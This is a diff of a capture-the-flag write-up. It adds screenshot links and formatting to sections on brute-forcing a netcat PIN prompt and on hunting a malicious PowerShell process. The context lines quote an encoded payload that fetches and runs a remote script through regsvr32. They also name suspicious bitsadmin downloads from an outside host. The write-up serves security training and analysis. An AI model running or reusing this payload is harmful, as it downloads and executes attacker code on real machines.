@@ -186,7 +186,7 @@ All four of them might be a possible correct flag so I tried all four of them...
 ``We had to let one our sysadmins go. They may have been leaking data. We suspect this server, challenges.ctfd.io:30129, was used but can't seem to get in. Can you help us get in?``
 
 I first connected to the remote server using `netcat` to somehow find out whats the deal with the challenge : 
-![nc](url)
+![nc](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/cybereason/nc.png)
 
 The remote server asks for a 4-digit pin as seen in the above screenshot and probably compares it with it's correct pin. I smell bruteforcing , do you smell that too..?
 
@@ -272,28 +272,28 @@ Aight... Let's go get this one too.
 
 Once Im in the website , I decided to check on `High` marked threats :
 
-![high](url)
+![high](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/cybereason/kelsey.png)
 
 Right there is what I need, a missuse of powershell.exe on kelsey-prodmgr.
 I clicked on that to have a deeper view on the threat and came up with this : 
 
-![cmd](url)
+![cmd](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/cybereason/nav.png)
 
 I clicked to expand them and quickly noticed an encoded powershell command at the fourth :
 ``/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1qAY2FsgAAAFBoMYtvh//Vu+AdKgpoppW9nf/VPAZ8CoD74HUFu0cTcm9qAFP/1XJlZ3N2cjMyIC9zIC9uIC91IC9pOmh0dHA6Ly82Ni4xNzUuMTAwLjQ1L3BheWxvYWQta2Vsc2V5LnNjdCBzY3JvYmouZGxsAA==
 ``
 
-![b64](url)
+![b64](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/cybereason/b64.png)
 
 I can see a file being dropped in the machine but sadly none of those filenames above were the correct flag so I decided to again open the tree of the following powershell process and see whats there :
 
-![tree2](url)
+![tree2](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/cybereason/tree2.png)
 
 Something interesting going on with bitsadmin.exe which tries to transfer 2 files : ``updates.xml`` and ``msbuild_nps.xml`` from http://rctesting.duckdns.org which seems suspicious...
 
 I tried to use both of the files as flags since ... why not? and ended up with one of them being correct.
 
-#### FLAG : msbuild_nps.xml
+#### FLAG : ``msbuild_nps.xml``
 
 # 02 Advanced 
 
